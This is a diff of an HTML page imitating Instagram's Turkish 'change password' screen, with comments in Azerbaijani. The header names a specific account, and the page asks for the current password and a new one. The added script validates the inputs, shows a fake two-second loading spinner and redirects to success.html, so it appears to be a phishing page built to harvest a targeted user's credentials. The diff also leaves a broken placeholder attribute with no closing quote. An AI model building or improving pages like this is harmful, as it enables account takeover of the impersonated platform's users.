@@ -5,106 +5,103 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Şifreyi değiştir</title>
     <style>
-        * {
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        * { box-sizing: border-box; font-family: -apple-system, system-ui, sans-serif; }
+        body { margin: 0; padding: 20px; background: #fff; display: flex; flex-direction: column; align-items: center; }
+        .container { width: 100%; max-width: 400px; }
+        .header-info { font-size: 14px; color: #262626; margin-bottom: 15px; font-weight: 500; }
+        h1 { font-size: 24px; font-weight: 700; margin-bottom: 12px; }
+        .description { font-size: 14px; color: #262626; line-height: 1.4; margin-bottom: 25px; }
+        
+        .input-group { margin-bottom: 5px; position: relative; }
+        input { 
+            width: 100%; padding: 16px; border: 1px solid #dbdbdb; border-radius: 12px; 
+            font-size: 14px; background: #fafafa; outline: none; transition: 0.2s;
         }
-
-        body {
-            margin: 0;
-            padding: 20px;
-            background-color: #ffffff;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 400px;
-        }
-
-        .header-info {
-            font-size: 14px;
-            color: #262626;
-            margin-bottom: 15px;
-            font-weight: 500;
-        }
-
-        h1 {
-            font-size: 24px;
-            font-weight: 700;
-            margin-bottom: 12px;
-            color: #000;
-        }
-
-        .description {
-            font-size: 14px;
-            color: #262626;
-            line-height: 1.4;
-            margin-bottom: 25px;
-        }
-
-        .input-group {
-            margin-bottom: 15px;
-        }
-
-        input {
-            width: 100%;
-            padding: 16px;
-            border: 1px solid #dbdbdb;
-            border-radius: 12px;
-            font-size: 14px;
-            background-color: #fafafa;
-            outline: none;
-        }
-
-        input::placeholder {
-            color: #8e8e8e;
-        }
-
-        input:focus {
-            border-color: #a8a8a8;
-        }
+        input:focus { border-color: #a8a8a8; }
+        
+        #error-msg { color: #ed4956; font-size: 12px; margin-bottom: 15px; display: none; margin-left: 5px; }
 
         .submit-btn {
-            width: 100%;
-            padding: 14px;
-            background-color: #b2dffc; /* Aktiv olmayan rəng, şəkildəki kimi */
-            color: #ffffff;
-            border: none;
-            border-radius: 25px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 200px; /* Şəkildəki aşağı boşluğu təmin etmək üçün */
+            width: 100%; padding: 14px; background-color: #b2dffc; color: #fff;
+            border: none; border-radius: 25px; font-size: 16px; font-weight: 600;
+            cursor: not-allowed; margin-top: 150px; position: relative;
         }
+        .submit-btn.active { background-color: #0095f6; cursor: pointer; }
+
+        /* Yükləmə animasiyası */
+        .loader {
+            display: none; width: 20px; height: 20px; border: 2px solid #ffffff;
+            border-bottom-color: transparent; border-radius: 50%;
+            animation: rotation 1s linear infinite; position: absolute; left: 47%;
+        }
+        @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="header-info">k.nsyvv • Instagram</div>
+    <div class="header-info">w.ramiz17 • Instagram</div>
     <h1>Şifreyi değiştir</h1>
-    
-    <p class="description">
-        Şifren en az 6 karakter olmalı ve rakamlar, harfler ve özel karakterlerden (!S@%) oluşmalıdır.
-    </p>
+    <p class="description">Şifren en az 6 karakter olmalı ve rakamlar, harfler ve özel karakterlerden (!S@%) oluşmalıdır.</p>
 
     <div class="input-group">
-        <input type="password" placeholder="Mevcut şifre (Güncelleme 06.04.2026)">
+        <input type="password" id="oldPass" placeholder="Mevcut şifre>
     </div>
 
     <div class="input-group">
-        <input type="password" placeholder="Yeni şifre">
+        <input type="password" id="newPass" placeholder="Yeni şifre">
     </div>
 
     <div class="input-group">
-        <input type="password" placeholder="Yeni şifreyi tekrar yaz">
+        <input type="password" id="confirmPass" placeholder="Yeni şifreyi tekrar yaz">
     </div>
+    <div id="error-msg">Şifre eşleşmedi</div>
 
-    <button class="submit-btn">Şifreyi değiştir</button>
+    <button id="submitBtn" class="submit-btn" disabled>
+        <span id="btnText">Şifreyi değiştir</span>
+        <div class="loader" id="loader"></div>
+    </button>
 </div>
+
+<script>
+    const oldPass = document.getElementById('oldPass');
+    const newPass = document.getElementById('newPass');
+    const confirmPass = document.getElementById('confirmPass');
+    const errorMsg = document.getElementById('error-msg');
+    const submitBtn = document.getElementById('submitBtn');
+    const btnText = document.getElementById('btnText');
+    const loader = document.getElementById('loader');
+
+    function validate() {
+        const isMatching = newPass.value === confirmPass.value && newPass.value !== "";
+        const allFilled = oldPass.value.length >= 1 && newPass.value.length >= 6;
+
+        if (confirmPass.value !== "" && newPass.value !== confirmPass.value) {
+            errorMsg.style.display = "block";
+        } else {
+            errorMsg.style.display = "none";
+        }
+
+        if (isMatching && allFilled) {
+            submitBtn.classList.add('active');
+            submitBtn.disabled = false;
+        } else {
+            submitBtn.classList.remove('active');
+            submitBtn.disabled = true;
+        }
+    }
+
+    [oldPass, newPass, confirmPass].forEach(input => input.addEventListener('input', validate));
+
+    submitBtn.addEventListener('click', () => {
+        btnText.style.display = "none";
+        loader.style.display = "inline-block";
+        
+        setTimeout(() => {
+            window.location.href = "success.html";
+        }, 2000); // 2 saniyəlik yükləmə ekranı
+    });
+</script>
 
 </body>
 </html>
